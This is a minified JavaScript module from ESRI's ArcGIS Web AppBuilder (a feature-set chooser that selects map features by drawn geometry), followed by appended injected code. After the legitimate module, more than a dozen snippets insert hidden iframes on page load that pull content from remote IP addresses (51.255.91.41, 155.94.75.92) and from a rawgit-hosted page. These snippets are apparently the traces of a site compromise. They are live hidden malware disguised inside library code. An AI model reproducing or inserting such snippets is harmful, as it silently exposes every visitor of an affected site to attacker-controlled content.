// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/on dojo/sniff dojo/Evented dojo/Deferred dojo/_base/lang dojo/_base/array dojo/_base/declare jimu/utils jimu/symbolUtils jimu/SelectionManager jimu/LayerInfos/LayerInfos esri/graphic esri/tasks/query esri/tasks/QueryTask esri/layers/FeatureLayer esri/symbols/jsonUtils".split(" "),function(m,r,t,k,d,n,u,p,q,v,w,x,f,y,g,z){return u([t],{baseClass:"jimu-featureset-chooser-core",_middleFeatureLayer:null,_isLoading:!1,_def:null,_isDestroyed:!1,_handles:null,selectionManager:null,layerInfosObj:null,
map:null,featureLayer:null,drawBox:null,updateSelection:!1,fullyWithin:!1,constructor:function(a){d.mixin(this,a);this.layerInfosObj=w.getInstanceSync();this.selectionManager=v.getInstance();this.featureLayer.getSelectionSymbol()||this.selectionManager.setSelectionSymbol(this.featureLayer);a=p.getFeatureLayerDefinition(this.featureLayer);delete a.id;this._middleFeatureLayer=new g({layerDefinition:a,featureSet:null},{id:"featureLayer_"+p.getRandomString()});a=null;var b=this._middleFeatureLayer.geometryType;
"esriGeometryPoint"===b?a=q.getDefaultMarkerSymbol():"esriGeometryPolyline"===b?a=q.getDefaultLineSymbol():"esriGeometryPolygon"===b&&(a=z.fromJson({style:"esriSFSSolid",color:[79,129,189,77],type:"esriSFS",outline:{style:"esriSLSSolid",color:[54,93,141,255],width:1.5,type:"esriSLS"}}));this._middleFeatureLayer.setSelectionSymbol(a);a=m(this.drawBox,"user-clear",d.hitch(this,this._onDrawBoxUserClear));b=m(this.drawBox,"draw-end",d.hitch(this,this._onDrawEnd));this._handles=[a,b]},hideMiddleFeatureLayer:function(){if(this._middleFeatureLayer){this._middleFeatureLayer.hide();
var a=this.selectionManager.getDisplayLayer(this._middleFeatureLayer.id);a&&a.hide()}},showMiddleFeatureLayer:function(){if(this._middleFeatureLayer){this._middleFeatureLayer.show();var a=this.selectionManager.getDisplayLayer(this._middleFeatureLayer.id);a&&a.show()}},clear:function(a){this.drawBox.clear();this._clearMiddleFeatureLayer();a&&this.selectionManager.clearSelection(this.featureLayer)},getFeatures:function(){var a=new k,b=d.hitch(this,function(){var b=this.syncGetFeatures();a.resolve(b)}),
c=d.hitch(this,function(b){a.reject(b)});1===this._getDeferredStatus(this._def)?this._def.then(b,c):b();return a},syncGetFeatures:function(){return(this.updateSelection?this.featureLayer:this._middleFeatureLayer).getSelectedFeatures()},isLoading:function(){return 1===this._getDeferredStatus(this._def)},_onLoading:function(){this.drawBox.deactivate();this.emit("loading")},_onUnloading:function(){this.emit("unloading")},_getDeferredStatus:function(a){var b=0;return b=a?a.isResolved()?2:a.isRejected()?
-1:1:0},_onDrawEnd:function(a,b,c,e,A,f){console.log(b,c);if(this.isLoading())throw"should not draw when loading";if(this.featureLayer.visible){var l=new k;this._def=l;var h=g.SELECTION_NEW;e&&(h=g.SELECTION_ADD);r("mac")?f&&(h=g.SELECTION_SUBTRACT):A&&(h=g.SELECTION_SUBTRACT);this._onLoading();this._getFeaturesByGeometry(a.geometry).then(d.hitch(this,function(a){this.selectionManager.updateSelectionByFeatures(this.updateSelection?this.featureLayer:this._middleFeatureLayer,a,h);this._onUnloading();
l.resolve(a)}),d.hitch(this,function(a){console.error(a);this._onUnloading();l.reject(a)}))}},_getFeaturesByGeometry:function(a){var b=new k,c=[];if(this.featureLayer.getMap())a=this.selectionManager.getClientFeaturesByGeometry(this.featureLayer,a,this.fullyWithin),0<a.length&&(c=n.map(a,d.hitch(this,function(a){return new x(a.toJson())}))),b.resolve(c);else{c=new f;c.geometry=a;c.outSpatialReference=this.map.spatialReference;c.returnGeometry=!0;c.spatialRelationship=this.fullyWithin?f.SPATIAL_REL_CONTAINS:
f.SPATIAL_REL_INTERSECTS;(a=this.featureLayer.getDefinitionExpression())||(a="1\x3d1");var e=this.layerInfosObj.getLayerInfoById(this.featureLayer.id);e&&(e=e.getFilter())&&(a="("+a+") AND ("+e+")");a&&(c.where=a);c.outFields=["*"];(new y(this.featureLayer.url)).execute(c).then(d.hitch(this,function(a){b.resolve(a.features)}),d.hitch(this,function(a){b.reject(a)}))}return b},_onDrawBoxUserClear:function(){this.clear()},_clearMiddleFeatureLayer:function(){this._middleFeatureLayer&&(this._middleFeatureLayer.clear(),
this.selectionManager.clearSelection(this._middleFeatureLayer))},destroy:function(){this._isDestroyed||(n.forEach(this._handles,d.hitch(this,function(a){a.remove()})),this._handles=null,this.clear());this._isDestroyed=!0}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});